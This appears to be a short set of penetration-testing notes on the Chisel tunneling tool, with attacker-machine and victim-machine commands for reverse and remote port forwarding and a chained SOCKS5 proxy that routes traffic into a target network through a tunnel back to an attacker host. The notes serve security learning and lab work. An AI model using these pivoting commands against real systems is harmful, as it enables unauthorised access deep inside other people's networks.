## Using Chisel

 ### Important links:  
* [https://github.com/jpillora/chisel/](https://github.com/jpillora/chisel/)  
* [https://0xdf.gitlab.io/2019/01/28/tunneling-with-chisel-and-ssf.html](https://0xdf.gitlab.io/2019/01/28/tunneling-with-chisel-and-ssf.html)  
  
### Basic Client Listener
#### local port forwarding:  
Attacker machine:  
* ./chisel server -p 8000 --reverse  
  
 Victim machine:  
* ./chisel client 1.1.1.1:8000 R:80:3.3.3.4:80

![[Chisel_local_port_forwrding.png]]

### Basic Server Listener
#### Remote Port Forwarding:  
Attacker machine:  
* ./chisel server -p 8000  
  
Victim machine:  
* ./chisel client 1.1.1.1:8000 9001:www.exploit-db.com:443

![[Chisel_remote_port_forwarding.png]]

### Socks Proxy:  
* ./chisel server -p 8000 --reverse  
* ./chisel client 1.1.1.1:8000 R:8001:127.0.0.1:9001  
Now anything I send to localhost:8001 on kali will forward to localhost:9001 on target.  
  
  
* ./chisel server -p 9001 --socks5  
* ./chisel client localhost:8001 socks  

This connection is forwarded through the first tunnel and connects to the chisel server running on the box. Now my local host is listening on port 1080 (default, can change that with arguments) and will send traffic to target, and then proxy it outbound.

![[Chisel_Sock_Proxy.png]]